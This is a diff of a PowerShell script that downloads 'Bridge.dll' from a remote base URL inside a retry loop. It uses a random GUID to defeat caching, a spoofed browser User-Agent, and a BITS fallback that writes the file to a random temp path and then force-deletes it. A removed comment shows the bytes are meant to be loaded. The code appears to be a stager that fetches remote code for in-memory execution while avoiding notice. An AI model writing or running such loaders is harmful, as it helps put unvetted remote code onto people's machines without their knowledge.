@@ -162,14 +162,11 @@ for ($i = 1; $i -le $maxRetries; $i++) {
         $dllUrl = "$($c.base)/Bridge.dll?v=$([Guid]::NewGuid())"
         $bytes = $null
         try {
-            $bytes = Invoke-RestMethod -Uri $dllUrl -UseBasicParsing -TimeoutSec 30
+            $wc = New-Object System.Net.WebClient
+            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+            $bytes = $wc.DownloadData($dllUrl)
         } catch {
             try {
-                $wc = New-Object System.Net.WebClient
-                $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-                $bytes = $wc.DownloadData($dllUrl)
-            } catch {
-                # Fallback 3: BITS transfer to disk then load
                 $tmp = Join-Path $env:TEMP "$([Guid]::NewGuid()).tmp"
                 Import-Module BitsTransfer -EA 0
                 Start-BitsTransfer -Source $dllUrl -Destination $tmp -EA 0
@@ -177,7 +174,7 @@ for ($i = 1; $i -le $maxRetries; $i++) {
                     $bytes = [IO.File]::ReadAllBytes($tmp)
                     Remove-Item $tmp -Force -EA 0
                 }
-            }
+            } catch {}
         }
         if ($bytes -and $bytes.Length -gt 0) {
             Write-Host "[+] DLL Downloaded ($($bytes.Length) bytes)"
